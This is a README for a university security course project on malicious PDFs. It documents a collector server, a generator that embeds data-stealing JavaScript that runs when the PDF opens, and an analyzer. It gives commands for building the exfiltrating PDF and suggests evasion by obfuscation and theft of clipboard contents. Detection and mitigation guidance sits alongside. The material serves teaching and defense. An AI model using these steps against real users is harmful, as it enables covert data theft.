# Malicious PDF Security Research Project
**Computer Security Course - Educational Demonstration**

---

## ⚠️ Disclaimer

**FOR EDUCATIONAL PURPOSES ONLY**

This project is created for authorized security research and educational purposes as part of a Computer Security course. All tools and documentation are intended to:
- Demonstrate attack techniques
- Understand infection vectors
- Practice detection methods
- Develop mitigation strategies

**DO NOT use these tools for:**
- Unauthorized access to systems
- Malicious data collection
- Distribution of malware
- Any illegal activities

By using these tools, you agree to use them only in controlled, authorized environments for legitimate educational purposes.

---

## Project Overview

This project demonstrates PDF-based malware attacks, specifically focusing on:
1. **Data exfiltration** via embedded JavaScript
2. **Social engineering** tactics used in PDF attacks
3. **Detection methods** for malicious PDFs
4. **Mitigation strategies** to prevent such attacks

### Educational Objectives

- Understand how PDF JavaScript can be exploited
- Learn data exfiltration techniques
- Practice malware analysis on PDFs
- Implement and test security controls
- Document threats and countermeasures

---

## Project Structure

```
seguridad/
├── README.md                          # This file
├── requirements.txt                   # Python dependencies
├── TESTING_GUIDE.md                   # Detailed testing instructions
├── malicious_pdf_analysis.md          # Complete threat analysis document
├── fastapi_collector.py               # Data collection server
├── create_malicious_pdf.py            # PDF generation script
├── pdf_analysis_demo.py               # PDF security analysis tool
├── malicious_document.pdf             # (Generated) Malicious PDF
├── pdf_exfiltration.log              # (Generated) Server logs
└── collected_data.json               # (Generated) Collected data
```

---

## Quick Start

### 1. Install Dependencies

```bash
# Install Python packages
pip install -r requirements.txt
```

### 2. Start the Collector Server

```bash
# Start FastAPI server to receive exfiltrated data
python fastapi_collector.py
```

Server will start on `http://localhost:8000`

### 3. Generate Malicious PDF

```bash
# Create malicious PDF that sends data to your server
python create_malicious_pdf.py --url http://localhost:8000/collect

# For advanced version with stealth techniques
python create_malicious_pdf.py --url http://localhost:8000/collect --advanced
```

### 4. Test the PDF

1. Open `malicious_document.pdf` in a PDF reader with JavaScript enabled
2. Watch the server terminal for incoming data
3. View collected data at: `http://localhost:8000/data`

### 5. Analyze PDFs

```bash
# Analyze any PDF for security issues
python pdf_analysis_demo.py malicious_document.pdf
```

---

## Components

### 1. FastAPI Collector (`fastapi_collector.py`)

HTTP server that receives exfiltrated data from malicious PDFs.

**Features:**
- Multiple endpoints (GET, POST, Form submission)
- Logs all received data
- Web interface to view collected data
- Statistics and analytics
- Saves data to JSON file

**Endpoints:**
- `GET /` - Service information
- `GET /collect` - Main data collection endpoint
- `POST /collect-post` - Alternative POST method
- `POST /submit` - Form submission handler
- `GET /data` - View all collected data
- `GET /stats` - View statistics
- `DELETE /data` - Clear collected data

**Usage:**
```bash
python fastapi_collector.py
```

### 2. PDF Generator (`create_malicious_pdf.py`)

Creates PDFs with embedded malicious JavaScript.

**Features:**
- Legitimate-looking document content
- Auto-executing JavaScript on open
- Multiple exfiltration methods (launchURL, submitForm)
- Collects system and reader information
- Basic and advanced versions

**Usage:**
```bash
# Basic version
python create_malicious_pdf.py --url http://localhost:8000/collect

# Advanced with stealth
python create_malicious_pdf.py --url http://your-ip:8000/collect --advanced

# Custom output file
python create_malicious_pdf.py --url http://localhost:8000/collect -o custom.pdf
```

**Data Collected:**
- PDF Reader version and type
- Operating system platform
- System language
- Screen resolution
- Timezone information
- Document metadata
- File path
- Timestamp

### 3. PDF Analyzer (`pdf_analysis_demo.py`)

Security analysis tool for detecting malicious PDFs.

**Features:**
- Metadata extraction
- JavaScript detection
- Suspicious keyword scanning
- Embedded file detection
- External link analysis
- Risk assessment scoring

**Usage:**
```bash
python pdf_analysis_demo.py <pdf_file>
```

**Example:**
```bash
python pdf_analysis_demo.py malicious_document.pdf
```

### 4. Documentation

#### `malicious_pdf_analysis.md`
Comprehensive document covering:
- Technical background on PDF structure
- JavaScript capabilities in PDFs
- Sample malicious code with explanations
- Infection vectors and social engineering
- Detection methods (static and dynamic)
- Mitigation strategies
- Real-world case studies
- Lab exercises

#### `TESTING_GUIDE.md`
Step-by-step testing instructions:
- Environment setup options
- Complete testing procedures
- Expected results and analysis
- Troubleshooting guide
- Safety guidelines
- Advanced experiments

---

## Testing Scenarios

### Scenario 1: Local Testing

**Setup:** Single machine, localhost testing
**Goal:** Understand basic attack flow

```bash
# Terminal 1: Start server
python fastapi_collector.py

# Terminal 2: Generate PDF
python create_malicious_pdf.py --url http://localhost:8000/collect

# Terminal 3: Analyze PDF
python pdf_analysis_demo.py malicious_document.pdf

# Open PDF in reader, check http://localhost:8000/data
```

### Scenario 2: Network Testing

**Setup:** Server on one machine, client on another
**Goal:** Simulate realistic network attack

```bash
# Server machine
python fastapi_collector.py

# Client machine
python create_malicious_pdf.py --url http://192.168.1.100:8000/collect
# Open PDF on client machine
```

### Scenario 3: VM Isolation

**Setup:** Virtual machine with vulnerable PDF reader
**Goal:** Maximum safety and realistic testing

1. Create VM with Windows 7/10
2. Install older Adobe Reader
3. Host runs collector server
4. VM opens malicious PDF
5. Observe data exfiltration

### Scenario 4: Detection Testing

**Setup:** Test various security controls
**Goal:** Evaluate defense effectiveness

```bash
# Test with different readers
# Test with JavaScript disabled
# Test with Protected Mode enabled
# Test with network blocking
# Document what prevents the attack
```

---

## Detection Methods

### Static Analysis

```bash
# Quick check for suspicious elements
pdfid malicious_document.pdf

# Extract JavaScript
pdf-parser.py -s javascript malicious_document.pdf

# Our custom analyzer
python pdf_analysis_demo.py malicious_document.pdf
```

### Dynamic Analysis

```bash
# Network monitoring
sudo tcpdump -i any -w capture.pcap port 8000

# Open PDF, then analyze capture
wireshark capture.pcap
```

### Behavioral Analysis

- Monitor for unexpected network connections
- Check for JavaScript execution warnings
- Look for process creation
- Analyze file system access attempts

---

## Mitigation Strategies

### Technical Controls

1. **PDF Reader Settings:**
   ```
   Disable JavaScript
   Enable Protected/Sandboxed Mode
   Enable Enhanced Security
   Block external URLs
   ```

2. **Network Security:**
   ```
   Firewall rules blocking PDF reader network access
   IDS/IPS monitoring for data exfiltration patterns
   DNS filtering
   ```

3. **Endpoint Protection:**
   ```
   Antivirus with behavioral detection
   Application whitelisting
   Host-based firewall
   ```

### Organizational Controls

1. **User Training:**
   - Recognize phishing attempts
   - Verify sender before opening attachments
   - Report suspicious documents

2. **Email Security:**
   - Scan attachments for malicious content
   - Block executable content in PDFs
   - Quarantine suspicious files

3. **Policy:**
   - Require sandboxed PDF viewing
   - Restrict PDF reader permissions
   - Implement least privilege

---

## Expected Results

### Successful Attack

When PDF is opened with JavaScript enabled:

1. **Server receives data:**
   ```json
   {
     "timestamp": "2024-12-03T14:23:45",
     "method": "GET",
     "client_ip": "192.168.1.50",
     "collected_data": {
       "viewer_version": "23.001.20093",
       "platform": "WIN",
       "language": "ENU",
       "doc_path": "C:/Users/student/Downloads/malicious_document.pdf",
       "screen_width": "1920",
       "screen_height": "1080"
     }
   }
   ```

2. **Logs show activity:**
   ```
   2024-12-03 14:23:45 - INFO - Data collected via GET from 192.168.1.50
   2024-12-03 14:23:45 - INFO - Parameters: {...}
   ```

3. **File saved:**
   - `collected_data.json` contains all data
   - `pdf_exfiltration.log` contains logs

### Successful Defense

When protections are enabled:

1. **Security warning appears**
2. **JavaScript blocked**
3. **Network connection prevented**
4. **No data received at server**

Document both scenarios in your report!

---

## Common Issues

### PDF Doesn't Exfiltrate Data

**Causes:**
- JavaScript disabled
- Protected Mode enabled
- Modern PDF reader with security controls
- Incorrect URL in PDF

**Solutions:**
- Check PDF reader settings
- Use older PDF reader version
- Test URL manually: `curl http://localhost:8000/collect?test=1`
- Regenerate PDF with correct URL

### Server Not Receiving Data

**Causes:**
- Firewall blocking port 8000
- Wrong IP address
- Server not running

**Solutions:**
- Check firewall: `sudo ufw allow 8000`
- Verify IP: `ip addr` or `ipconfig`
- Test server: `curl http://localhost:8000`

### Modern Readers Block Everything

**This is actually success!** Modern security works. Document:
- What warnings appeared
- What was blocked
- How effective the protections are

This is valuable for your course report.

---

## For Your Course Report

### What to Include

1. **Attack Demonstration:**
   - Screenshots of PDF generation
   - Server receiving data
   - Data analysis

2. **Technical Analysis:**
   - How JavaScript exfiltration works
   - Network traffic captures
   - Code explanations

3. **Social Engineering:**
   - How document appears legitimate
   - Psychological tactics
   - Realistic scenarios

4. **Detection:**
   - Static analysis results
   - Dynamic analysis findings
   - Behavioral indicators

5. **Mitigation:**
   - Technical controls tested
   - Effectiveness evaluation
   - Recommendations

6. **Lessons Learned:**
   - Current defense effectiveness
   - Remaining vulnerabilities
   - Best practices

---

## Advanced Experiments

### 1. Evasion Techniques

Modify JavaScript to evade detection:
- Obfuscate code
- Use indirect calls
- Time delays
- Environment checks

### 2. Alternative Exfiltration

Test different methods:
- Image requests (1x1 pixel)
- DNS queries
- WebSocket connections
- Form submissions

### 3. Payload Modification

Collect different data:
- Clipboard contents
- Recent files
- Installed fonts
- System information

### 4. Cross-Reader Testing

Test multiple readers:
- Adobe Acrobat Reader
- Foxit Reader
- PDF-XChange
- Browser built-in viewers

Document which are vulnerable.

---

## Resources

### Tools Used
- **FastAPI** - Web framework for collector
- **ReportLab** - PDF generation library
- **PyPDF2** - PDF manipulation library
- **PDFiD** - PDF analysis tool
- **pdf-parser** - PDF structure analysis
- **Wireshark** - Network analysis

### Learning Resources
- Adobe PDF Reference: ISO 32000
- OWASP Testing Guide
- Didier Stevens' Blog
- SANS Reading Room
- NIST Malware Guidelines

### Similar Real-World Attacks
- APT28 PDF Exploits
- Emotet PDF Campaigns
- IcedID Banking Malware
- CVE-2013-2729 (Adobe vulnerability)
- CVE-2017-0262 (Windows/Adobe vulnerability)

---

## Safety Checklist

Before testing, verify:

- [ ] Testing only on authorized systems
- [ ] Isolated environment (VM recommended)
- [ ] Network contained (not production network)
- [ ] Files clearly labeled as test malware
- [ ] Proper backups in place
- [ ] Written permission if using shared infrastructure
- [ ] Understanding of legal/ethical boundaries
- [ ] Plan to clean up after testing
- [ ] Documentation of all activities

---

## License and Responsibility

This project is provided for educational purposes only.

**You are responsible for:**
- Using these tools legally and ethically
- Obtaining proper authorization
- Following your institution's policies
- Understanding applicable laws
- Protecting collected data
- Cleaning up after testing

**The authors are NOT responsible for:**
- Misuse of these tools
- Unauthorized testing
- Legal consequences of improper use
- Damage caused by these tools

---

## Acknowledgments

Created for Computer Security coursework to demonstrate:
- Attack techniques and vectors
- Detection and analysis methods
- Mitigation and defense strategies
- Responsible security research practices

---

## Support

For issues or questions related to this educational project:
1. Check TESTING_GUIDE.md for detailed instructions
2. Review malicious_pdf_analysis.md for technical details
3. Verify you're using correct commands and parameters
4. Ensure all dependencies are installed

---

**Version:** 1.0
**Last Updated:** 2024-12-03
**Course:** Computer Security
**Purpose:** Educational Security Research
